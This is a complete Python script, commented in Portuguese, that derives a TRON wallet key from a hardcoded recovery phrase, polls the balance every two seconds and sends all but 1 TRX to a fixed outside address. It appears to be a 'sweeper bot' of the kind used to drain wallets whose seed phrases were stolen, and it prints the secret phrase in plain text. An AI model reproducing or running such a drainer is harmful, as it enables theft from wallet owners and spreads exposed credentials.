import time
from tronpy import Tron
from tronpy.keys import PrivateKey
from mnemonic import Mnemonic
from bip32 import BIP32

# Frase mnemônica (chave de recuperação)
mnemonic_phrase = "popular music denial search program win scene surface canal stairs camera coconut"

# Gera a chave privada a partir da frase mnemônica
mnemo = Mnemonic("english")
if not mnemo.check(mnemonic_phrase):
    raise ValueError("Frase mnemônica inválida")

# Gera a seed a partir da frase mnemônica
seed = mnemo.to_seed(mnemonic_phrase)

# Usando BIP32 para derivar a chave privada
bip32 = BIP32.from_seed(seed)
private_key = bip32.get_privkey_from_path("m/44'/195'/0'/0/0")
key = PrivateKey(private_key)

# Função para criar o cliente Tron
def create_tron_client():
    return Tron()

# Testa a conexão com o nó diretamente usando a chave privada
def test_connection(client):
    try:
        client.get_chain_parameters()
        print("Conexão estabelecida com sucesso!")
    except Exception as e:
        print(f"Erro ao conectar ao nó: {e}")
        exit()

# Verifica se a conta existe e retorna o saldo
def get_account_balance(client, address):
    try:
        account = client.get_account(address)
        balance = account.get("balance", 0) / 1_000_000  # Converte de "sun" para TRX
        print(f"Saldo verificado: {balance:.6f} TRX")
        return balance
    except Exception as e:
        print(f"Erro ao verificar a conta: {e}")
        return 0

# Realiza a transferência deixando sempre 1 TRX para taxas
def transfer_balance(client, address, destination_address, key):
    try:
        balance = get_account_balance(client, address)

        if balance <= 2:
            print(f"Saldo insuficiente para transferência. Saldo atual: {balance:.6f} TRX")
            return False

        # Calcula o valor a transferir deixando 1 TRX para taxas
        transfer_amount = balance - 1
        print(f"SALDO ENCONTRADO: {balance:.6f} TRX | ENVIANDO: {transfer_amount:.6f} TRX (Deixando 1 TRX para taxas)")

        transaction = client.trx.transfer(
            address,
            destination_address,
            int(transfer_amount * 1_000_000)  # Converte para "sun"
        ).build()

        signed_transaction = transaction.sign(key)
        result = client.broadcast(signed_transaction)

        if result.get("result", False):
            print(f"Transferência realizada com sucesso! TxID: {result['txid']}")
            return True
        else:
            print(f"Erro na transferência: {result.get('message', 'Erro desconhecido')}")
            return False
    except Exception as e:
        print(f"Erro ao realizar transferência: {e}")
        return False

# Loop principal com intervalo de 2 segundos para consultar saldo
def main():
    client = create_tron_client()
    test_connection(client)

    address = key.public_key.to_base58check_address()
    destination_address = "TDvxRL3y4Gz8UpM4KHFw3dBcvKdUYf7hm4"

    while True:
        print(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] Verificando saldo...")
        balance = get_account_balance(client, address)

        if balance > 2:
            transferred = transfer_balance(client, address, destination_address, key)
            if transferred:
                print("Transferência realizada. Continuando monitoramento...")
            else:
                print("Nenhuma transferência realizada. Aguardando...")
        else:
            print("Saldo insuficiente para transferência. Aguardando...")

        time.sleep(2)  # Espera de 2 segundos entre cada consulta

if __name__ == "__main__":
    main()
